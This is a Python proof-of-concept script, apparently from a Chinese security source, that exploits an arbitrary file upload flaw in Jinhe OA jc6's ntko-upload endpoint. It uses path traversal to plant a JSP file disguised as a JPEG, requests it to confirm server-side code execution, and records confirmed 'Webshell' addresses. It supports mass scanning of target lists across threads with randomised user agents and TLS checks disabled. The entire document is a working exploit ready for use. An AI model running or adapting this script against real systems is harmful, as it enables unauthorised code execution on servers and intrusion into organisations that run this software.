import requests,argparse,sys,random
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# 随机UA头
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

# 定义边界和Payload
BOUNDARY = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
JSP_PAYLOAD = '<% out.print(1111111*2222222);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>'
UPLOAD_PATH = "../../../../upload/abcde.jsp"  # 路径遍历上传位置
ACCESS_PATH = "/upload/abcde.jsp"             # 访问上传文件的路径

def get_headers():
    i = random.choice(USER_AGENTS)
    return {"User-Agent": i}

def build_multipart_data():
    """构建multipart/form-data请求体"""
    data = f"""------{BOUNDARY}
Content-Disposition: form-data; name="Submit"

upload
------{BOUNDARY}
Content-Disposition: form-data; name="filename"

{UPLOAD_PATH}
------{BOUNDARY}
Content-Disposition: form-data; name="upLoadFile"; filename="abcde.jpg"
Content-Type: image/jpeg

{JSP_PAYLOAD}
------{BOUNDARY}--
"""
    return data

def poc(target):
    try:
        # 清理URL格式
        target = target.rstrip('/')
        
        upload_url = f"{target}/jc6/ntkoUpload/ntko-upload!upload.action"
        check_url = f"{target}{ACCESS_PATH}"
        
        headers = get_headers()
        # 为上传请求设置特殊的Content-Type
        upload_headers = headers.copy()
        upload_headers["Content-Type"] = f"multipart/form-data; boundary={BOUNDARY}"
        
        # 构建请求体
        data = build_multipart_data()
        
        print(f"[*] 正在尝试上传文件到: {upload_url}")
        # 发送文件上传请求
        upload_resp = requests.post(
            url=upload_url,
            headers=upload_headers,
            data=data,
            verify=False,
            timeout=15
        )
        
        # 等待一下确保文件写入
        import time
        time.sleep(2)
        
        print(f"[*] 正在尝试访问上传的文件: {check_url}")
        # 尝试访问上传的JSP文件
        access_resp = requests.get(
            url=check_url,
            headers=headers,
            verify=False,
            timeout=15
        )
        
        # 检查访问结果
        if access_resp.status_code == 200:
            # 检查响应内容中是否包含JSP执行的结果 (1111111*2222222 = 2469135308642)
            if "2469135308642" in access_resp.text:
                print(f"[+] {target} 存在NTKO文件上传漏洞！")
                print(f"[+] Webshell地址: {check_url}")
                with open('result.txt', 'a', encoding='utf-8') as fp:
                    fp.write(f"{target} - Webshell: {check_url}\n")
                return True
            else:
                print(f"[-] {target} 文件上传成功但未执行")
        else:
            print(f"[-] {target} 文件上传或访问失败，状态码: {access_resp.status_code}")
            
    except:
        pass
    
    return False

def main():
    parse = argparse.ArgumentParser(description="金和OA jc6 ntko-upload任意文件上传漏洞检测脚本")
    parse.add_argument('-u', '--url', dest="url", type=str, help="输入测试网站的url：http://xxx.com")
    parse.add_argument('-f', '--file', dest="file", type=str, help="批量扫描的文件路径，每行一个")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip())
        mp = Pool(10)  # 减少线程数，避免过多并发
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"请输入：python {sys.argv[0]} -h")

if __name__ == "__main__":
    main()